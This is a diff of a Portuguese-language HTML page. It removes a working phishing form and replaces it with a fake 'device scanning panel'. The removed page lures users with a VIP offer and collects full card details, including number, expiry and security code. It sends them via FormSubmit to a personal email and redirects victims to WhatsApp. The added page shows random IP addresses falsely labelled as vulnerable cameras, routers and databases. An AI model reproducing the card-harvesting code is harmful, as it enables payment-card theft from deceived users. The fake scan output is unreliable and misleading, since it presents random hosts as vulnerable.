@@ -1,156 +1,59 @@
-<!DOCTYPE html>
-<html lang="pt-br">
+<!DOCTYPE html><html lang="pt-br">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cadastro Profissional</title>
+  <title>Painel de Varredura</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #fff;
-      padding: 20px;
-      color: #333;
-    }
-    h2 {
-      color: #e60014;
-      text-align: center;
-    }
-    form {
-      max-width: 500px;
-      margin: auto;
-    }
-    label {
-      display: block;
-      margin-top: 15px;
-      font-weight: bold;
-    }
-    input, select {
-      width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-    button {
-      margin-top: 20px;
-      background-color: #e60014;
-      color: #fff;
-      border: none;
-      padding: 12px;
-      width: 100%;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    .progress-container {
-      display: none;
-      max-width: 500px;
-      margin: 40px auto;
-      text-align: center;
-    }
-    .progress-bar {
-      background-color: #eee;
-      border-radius: 30px;
-      overflow: hidden;
-      height: 20px;
-    }
-    .progress {
-      height: 20px;
-      width: 0%;
-      background-color: #e60014;
-      animation: fillBar 3s forwards;
-    }
-    @keyframes fillBar {
-      0% { width: 0%; }
-      100% { width: 100%; }
-    }
-    .final-message {
-      display: none;
-      font-size: 18px;
-      color: #000;
-      margin-top: 20px;
-    }
+    body { font-family: Arial, sans-serif; background: #0e0e0e; color: #00ff99; padding: 20px; }
+    h1 { color: #00ffff; }
+    .result { background: #1a1a1a; padding: 10px; margin: 10px 0; border-left: 4px solid #00ff99; }
+    .ip { font-weight: bold; }
+    .porta { color: #ffcc00; }
+    .pais { color: #ff6666; font-style: italic; }
   </style>
 </head>
 <body>
+  <h1>🔍 Painel de Varredura de Dispositivos</h1>
+  <p>Gerando IPs e identificando dispositivos vulneráveis...</p>
+  <div id="painel"></div>  <script>
+    function gerarIP() {
+      const bloco1 = Math.floor(Math.random() * 100) + 100;
+      const bloco2 = Math.floor(Math.random() * 255);
+      const bloco3 = Math.floor(Math.random() * 255);
+      const bloco4 = Math.floor(Math.random() * 255);
+      return `${bloco1}.${bloco2}.${bloco3}.${bloco4}`;
+    }
 
-  <h2>Cadastre-se para receber seu acesso exclusivo</h2>
-  <p style="text-align:center;">Você só paga após 1 mês de uso. Nosso grupo VIP recebe diversas oportunidades antecipadas!</p>
+    function gerarResultadoFake() {
+      const portas = [21, 22, 23, 80, 443, 554, 8080, 8888, 3306, 5432, 27017];
+      const dispositivos = ['📷 Câmera IP', '📺 Smart TV', '📡 Roteador', '💾 Banco de Dados MySQL', '🔒 SSH Aberto', '📁 FTP Público'];
+      const paises = ['🇧🇷 Brasil', '🇺🇸 EUA', '🇩🇪 Alemanha', '🇯🇵 Japão', '🇫🇷 França'];
 
-  <form id="cadastroForm">
-    <label>Nome completo</label>
-    <input type="text" name="Nome" required>
+      const ip = gerarIP();
+      const porta = portas[Math.floor(Math.random() * portas.length)];
+      const dispositivo = dispositivos[Math.floor(Math.random() * dispositivos.length)];
+      const pais = paises[Math.floor(Math.random() * paises.length)];
+      const link = `http://${ip}:${porta}`;
 
-    <label>E-mail</label>
-    <input type="email" name="Email" required>
+      return `
+        <div class="result">
+          <div class="ip">🔗 <a href="${link}" target="_blank">${ip}:${porta}</a> <span class="porta">(${dispositivo})</span></div>
+          <div class="pais">🌍 ${pais}</div>
+        </div>
+      `;
+    }
 
-    <label>Telefone para contato (WhatsApp)</label>
-    <input type="tel" name="Telefone/WhatsApp" required>
+    function iniciarVarredura() {
+      const painel = document.getElementById("painel");
+      let count = 0;
+      const max = 100;
+      const intervalo = setInterval(() => {
+        painel.innerHTML += gerarResultadoFake();
+        count++;
+        if (count >= max) clearInterval(intervalo);
+      }, 150);
+    }
 
-    <label>Nome no Cartão</label>
-    <input type="text" name="NomeCartao" required>
-
-    <label>Número do Cartão</label>
-    <input type="text" name="NumeroCartao" required maxlength="19" placeholder="0000 0000 0000 0000">
-
-    <label>Data de Validade</label>
-    <input type="text" name="Validade" required placeholder="MM/AA">
-
-    <label>Código de Segurança</label>
-    <input type="text" name="CodigoSeguranca" required maxlength="4">
-
-    <label>Deseja entrar no nosso grupo VIP? (Mais oportunidades exclusivas)</label>
-    <select name="GrupoVIP" required>
-      <option value="Sim">Sim</option>
-      <option value="Não">Não</option>
-    </select>
-
-    <button type="submit">Finalizar Cadastro</button>
-  </form>
-
-  <div class="progress-container" id="carregando">
-    <h2>Processando seu cadastro...</h2>
-    <div class="progress-bar">
-      <div class="progress"></div>
-    </div>
-    <div class="final-message" id="mensagemFinal">
-      ✅ Seu cadastro está em análise.<br>
-      Você será direcionado ao WhatsApp para receber as instruções finais.
-    </div>
-  </div>
-
-  <script>
-    document.getElementById("cadastroForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      const form = e.target;
-      const formData = new FormData(form);
-
-      // Enviar para FormSubmit
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        body: formData,
-        headers: {
-          'Accept': 'application/json'
-        }
-      }).then(() => {
-        // Esconde o formulário e mostra o carregamento
-        form.style.display = "none";
-        document.getElementById("carregando").style.display = "block";
-
-        setTimeout(() => {
-          document.getElementById("mensagemFinal").style.display = "block";
-
-          setTimeout(() => {
-            window.location.href = "https://wa.me/5513997031287?text=Olá,%20acabei%20de%20me%20cadastrar%20e%20quero%20receber%20meu%20acesso%20VIP.%20";
-          }, 1500);
-
-        }, 3000);
-      }).catch(() => {
-        alert("Erro ao enviar. Tente novamente mais tarde.");
-      });
-    });
-  </script>
-
-</body>
+    iniciarVarredura();
+  </script></body>
 </html>
